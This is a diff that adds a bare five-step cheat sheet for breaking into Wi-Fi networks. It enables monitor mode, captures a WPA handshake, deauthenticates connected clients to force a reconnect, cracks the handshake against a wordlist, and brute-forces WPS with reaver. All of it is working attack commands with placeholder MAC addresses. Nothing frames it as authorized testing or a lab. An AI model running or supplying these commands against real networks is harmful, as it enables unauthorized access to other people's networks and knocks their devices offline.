@@ -1,0 +1,14 @@
+# 1. Set interface to monitor mode
+airmon-ng start wlan0
+
+# 2. Capture handshake
+airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon
+
+# 3. (Optional) Deauth to force handshake
+aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon
+
+# 4. Crack with dictionary
+aircrack-ng -w wordlist.txt -b AA:BB:CC:DD:EE:FF capture-01.cap
+
+# 5. WPS attack (much faster)
+reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv
